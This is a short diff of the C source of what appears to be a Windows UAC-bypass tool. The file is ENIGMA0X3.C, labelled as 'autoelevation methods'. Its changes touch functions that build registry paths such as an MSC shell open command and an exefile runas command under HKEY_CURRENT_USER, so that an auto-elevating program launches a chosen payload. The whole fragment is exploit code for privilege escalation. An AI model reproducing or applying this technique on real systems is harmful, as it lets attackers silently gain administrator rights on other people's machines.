@@ -4,9 +4,9 @@
 *
 *  TITLE:       ENIGMA0X3.C
 *
-*  VERSION:     2.86
+*  VERSION:     2.87
 *
-*  DATE:        15 Jan 2018
+*  DATE:        19 Jan 2018
 *
 *  Enigma0x3 autoelevation methods and everything based on the same
 *  ShellExecute related registry manipulations idea.
@@ -91,9 +91,11 @@ BOOL ucmHijackShellCommandMethod(
             _strcat(lpBuffer, L",WdsInitialize");
         }
 
+        _strcpy(szBuffer, T_MSC_SHELL);
+        _strcat(szBuffer, T_SHELL_OPEN_COMMAND);
         lResult = RegCreateKeyEx(
             HKEY_CURRENT_USER,
-            T_MSC_SHELL,
+            szBuffer,
             0,
             NULL,
             REG_OPTION_NON_VOLATILE,
@@ -456,7 +458,9 @@ BOOL ucmSdcltIsolatedCommandMethod(
 
         sz = _strlen(lpszPayload);
 
-        lResult = RegCreateKeyEx(HKEY_CURRENT_USER, T_EXEFILE_SHELL, 0, NULL,
+        _strcpy(szBuffer, T_EXEFILE_SHELL);
+        _strcat(szBuffer, T_SHELL_RUNAS_COMMAND);
+        lResult = RegCreateKeyEx(HKEY_CURRENT_USER, szBuffer, 0, NULL,
             REG_OPTION_NON_VOLATILE, MAXIMUM_ALLOWED, NULL, &hKey, NULL);
 
         if (lResult != ERROR_SUCCESS)
